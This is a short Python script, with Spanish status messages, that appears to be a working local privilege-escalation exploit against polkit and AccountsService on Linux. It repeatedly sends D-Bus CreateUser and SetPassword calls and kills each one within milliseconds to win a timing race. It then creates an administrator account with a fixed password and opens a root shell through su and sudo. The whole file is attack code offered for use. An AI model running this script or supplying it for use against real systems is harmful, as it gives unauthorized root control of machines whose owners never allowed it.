import os,sys,time,subprocess,random,pwd

print(" [\033[1;32m+\033[1;37m] Iniciando el exploit ")

check = True
counter = 0
while check:
    counter = counter +1
    process = subprocess.Popen(['dbus-send','--system','--dest=org.freedesktop.Accounts','--type=method_call','--print-reply','/org/freedesktop/Accounts','org.freedesktop.Accounts.CreateUser','string:usuario','string:"usuario','int32:1'])
    try:
        Random = random.uniform(0.006,0.009)
        process.wait(timeout=Random)
        process.kill()
    except subprocess.TimeoutExpired:
            process.kill()

    user = subprocess.run(['id', 'usuario'], stdout=subprocess.PIPE).stdout.decode('utf-8')
    if user.find("uid") != -1:
        print(" [\033[1;32m+\033[1;37m] Usuario creado con el nombre de gato ")
        check =False
        break
    if counter > 2000:
        print(" [\033[1;31m+\033[1;37m] No se pudo agregar el usuario, int√©ntalo de nuevo, puede funcionar ")
        sys.exit(0)

for i in range(200):
    uid = "/org/freedesktop/Accounts/User"+str(pwd.getpwnam('usuario').pw_uid)

    password = "string:"

    process = subprocess.Popen(['dbus-send','--system','--dest=org.freedesktop.Accounts','--type=method_call','--print-reply',uid,'org.freedesktop.Accounts.User.SetPassword',password,'string:GoldenEye'])
    try:
            Random = random.uniform(0.006,0.009)
            process.wait(timeout=Random)
            process.kill()
    except subprocess.TimeoutExpired:
            process.kill()

print(" [\033[1;32m+\033[1;37m] Exploit completado ")

p = subprocess.call("(su usuario -c 'sudo su')", shell=True)
